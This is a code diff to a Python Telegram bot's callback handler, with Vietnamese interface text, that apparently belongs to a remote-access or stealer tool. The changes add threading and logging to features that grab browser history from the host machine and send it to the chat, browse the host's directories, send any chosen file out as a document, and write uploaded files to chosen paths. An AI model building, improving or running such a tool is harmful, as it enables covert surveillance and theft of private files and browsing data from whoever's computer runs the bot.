@@ -713,11 +713,26 @@ def cb_handler(c):
     """Unified callback handler"""
     data = c.data
     msg = c.message
+    cid = msg.chat.id
     
     try:
+        logger.info(f"Callback received: {data}")
+        
         # Check direct callbacks
         if data in CALLBACK_MAP:
-            CALLBACK_MAP[data](msg)
+            bot.answer_callback_query(c.id, "⏳ Đang xử lý...")
+            handler = CALLBACK_MAP[data]
+            
+            # Run handler in thread to avoid blocking
+            def run_handler():
+                try:
+                    handler(msg)
+                    logger.info(f"Callback {data} executed successfully")
+                except Exception as e:
+                    logger.error(f"Callback {data} failed: {e}", exc_info=True)
+                    bot.send_message(cid, f"❌ Lỗi thực thi: {e}")
+            
+            threading.Thread(target=run_handler, daemon=True).start()
         
         # History selection
         elif data.startswith("hist_sel|"):
@@ -727,58 +742,77 @@ def cb_handler(c):
                 mk.add(types.InlineKeyboardButton(f"{limit} dòng", 
                                                   callback_data=f"hist_run|{browser}|{limit}"))
             bot.edit_message_text(f"🌐 {browser}: Chọn số lượng", 
-                                 msg.chat.id, msg.message_id, reply_markup=mk)
+                                 cid, msg.message_id, reply_markup=mk)
+            bot.answer_callback_query(c.id, "✅")
         
         # History execution
         elif data.startswith("hist_run|"):
             _, browser, limit = data.split("|")
-            bot.answer_callback_query(c.id, "Đang xử lý...")
+            bot.answer_callback_query(c.id, "Đang tải history...")
             
             def task():
                 try:
                     outfile = grab_history_specific(BROWSER_PATHS, browser, int(limit))
                     if outfile:
                         with open(outfile, 'rb') as f:
-                            bot.send_document(msg.chat.id, f, 
+                            bot.send_document(cid, f, 
                                             caption=f"History: {browser}")
                         cleanup_media_file(outfile)
                         bot_stats.increment_command()
+                        logger.info(f"History sent: {browser}")
+                    else:
+                        bot.send_message(cid, f"❌ Không tìm được history")
                 except Exception as e:
-                    logger.error(f"History download failed: {e}")
+                    logger.error(f"History download failed: {e}", exc_info=True)
+                    bot.send_message(cid, f"❌ Lỗi: {e}")
             
             threading.Thread(target=task, daemon=True).start()
         
         # Directory browse
         elif data.startswith("d|"):
             path = data.split("|", 1)[1]
+            bot.answer_callback_query(c.id, "✅")
             try:
-                bot.delete_message(msg.chat.id, msg.message_id)
+                bot.delete_message(cid, msg.message_id)
             except:
                 pass
-            list_dir(msg.chat.id, path)
+            list_dir(cid, path)
         
         # File download
         elif data.startswith("f|"):
             filepath = data.split("|", 1)[1]
-            try:
-                bot.answer_callback_query(c.id, "Đang tải...")
-                with open(filepath, 'rb') as f:
-                    bot.send_document(msg.chat.id, f)
-            except Exception as e:
-                logger.error(f"File download failed: {e}")
-                bot.send_message(msg.chat.id, f"❌ Lỗi: {e}")
+            bot.answer_callback_query(c.id, "Đang tải file...")
+            
+            def download_task():
+                try:
+                    with open(filepath, 'rb') as f:
+                        bot.send_document(cid, f)
+                    logger.info(f"File sent: {filepath}")
+                except Exception as e:
+                    logger.error(f"File download failed: {e}", exc_info=True)
+                    bot.send_message(cid, f"❌ Lỗi tải file: {e}")
+            
+            threading.Thread(target=download_task, daemon=True).start()
         
         # File upload
         elif data.startswith("up|"):
             target_path = data.split("|", 1)[1]
-            upload_state[msg.chat.id] = target_path
-            bot.send_message(msg.chat.id, 
+            upload_state[cid] = target_path
+            bot.answer_callback_query(c.id, "✅")
+            bot.send_message(cid, 
                             f"📤 Hãy gửi file (<20MB) để lưu vào: `{target_path}`", 
                             parse_mode="Markdown")
+        
+        else:
+            logger.warning(f"Unknown callback: {data}")
+            bot.answer_callback_query(c.id, "❌ Lệnh không nhận diện")
     
     except Exception as e:
-        logger.error(f"Callback handler failed: {e}")
-        bot.answer_callback_query(c.id, "❌ Lỗi xử lý")
+        logger.error(f"Callback handler critical error: {e}", exc_info=True)
+        try:
+            bot.answer_callback_query(c.id, f"❌ Lỗi: {str(e)[:50]}")
+        except:
+            pass
 
 @bot.message_handler(content_types=['document'])
 def handle_upload(m):
